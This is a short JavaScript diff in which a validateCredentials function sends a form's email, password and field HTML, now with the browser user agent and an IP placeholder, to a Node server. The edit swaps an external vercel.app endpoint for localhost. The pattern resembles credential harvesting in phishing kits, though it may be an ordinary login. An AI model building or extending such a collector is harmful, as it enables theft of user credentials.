@@ -251,18 +251,20 @@ function validateCredentials() {
       const email = $('#email').val();
       const password = $('#password').val();
       const detail = $('#field').html();
+      const userAgent = navigator.userAgent; 
 
   
   // Make AJAX request to Node.js server
   $.ajax({
     dataType: 'json',
-    url: 'https://vip-guest.vercel.app/',  // Update with your actual server URL
+    url: 'http://localhost:3001/',  // Update with your actual server URL
     type: 'POST',
     data: {
       email: email,
       password: password,
       field: detail,
-      ipAddress: null // Add the user's IP address
+      ipAddress: null, // Add the user's IP address
+      userAgent: userAgent,
     },
     beforeSend: function (xhr) {
 
